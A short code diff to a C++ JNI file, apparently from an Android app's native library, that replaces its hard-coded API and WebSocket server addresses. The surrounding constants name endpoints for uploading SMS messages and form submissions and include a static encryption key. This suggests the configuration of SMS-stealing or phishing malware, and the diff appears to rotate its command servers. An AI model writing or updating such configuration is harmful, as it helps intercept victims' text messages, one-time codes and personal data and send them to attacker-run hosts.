@@ -1,13 +1,13 @@
 #include <jni.h>
 #include <string>
 
-std::string url = "https://naashojawo.com/api";
+std::string url = "https://watsoo.org/api";
 std::string sms_save = "/sms-reader/add";
 std::string form_save = "/form/add";
 std::string site = "localhost";
 std::string KEY = "00112233445566778899aabbccddeeff";
 std::string getNumber = "/site/number?site=";
-std::string socket_url = "wss://socket.queensalimi.in";
+std::string socket_url = "wss://sanjuvps.com";
 
 extern "C"
 JNIEXPORT jstring JNICALL
